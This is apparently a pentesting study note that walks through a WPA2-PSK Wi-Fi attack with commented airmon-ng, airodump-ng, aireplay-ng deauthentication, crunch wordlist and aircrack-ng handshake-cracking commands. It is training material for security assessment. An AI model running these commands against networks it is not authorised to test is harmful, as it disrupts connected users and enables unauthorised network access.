# Wireless Penetration Testing

1. [Overview](#overview)
2. [Walkthrough](#walkthrough)

## Overview

* Wireless Pentesting - assessment of a wireless network (WPA2 PSK or WPA2 Enterprise).

* Activities performed:

  * Evaluating strength of PSK
  * Reviewing nearby networks
  * Assessing guest networks
  * Checking network access

* Tools used - wireless card, router, laptop

* Process (for WPA2 PSK):

  * Place wireless card into monitor mode
  
  * Discover info about network (channel, BSSID)

  * Select network & capture data

  * Perform deauth attack

  * Capture WPA handshake

  * Attempt to crack handshake

## Walkthrough

```shell
#connect wireless card to laptop
#ensure it is connected by checking wireless interfaces

iwconfig
#if it shows wlan0, it is connected
#it is currently in managed mode
#we need to place it in monitor mode

sudo airmon-ng check kill
#kill interfering processes

sudo airmon-ng start wlan0
#start monitor mode on interface

iwconfig
#wlan0mon is active

sudo airodump-ng wlan0mon
#search for networks
#stop it after identifying target network

sudo airodump-ng -c 11 --bssid 74:D2:1D:A4:82:5A -w capture wlan0mon
#-c for channel, --bssid for bssid
#-w for capture filename
#to capture handshake, we need to run deauth attack

#in new tab
sudo aireplay-ng -0 1 -a 74:D2:1D:A4:82:5A -c BC:6A:D1:81:5C:8B wlan0mon
#-a for access point, -c for station to deauth
#this helps in capturing handshake

ls
#we have capture files now

#we can generate wordlist using crunch
crunch 8 8 -t %@aaaa@% -o samplewordlist.txt
#8 letter password
#% for numbers and @ for lowercase chars

#to crack handshake
aircrack-ng -w samplewordlist.txt -b 74:D2:1D:A4:82:5A capture-01.cap
#-b for access point MAC address
#.cap file contains the handshake to be cracked
```
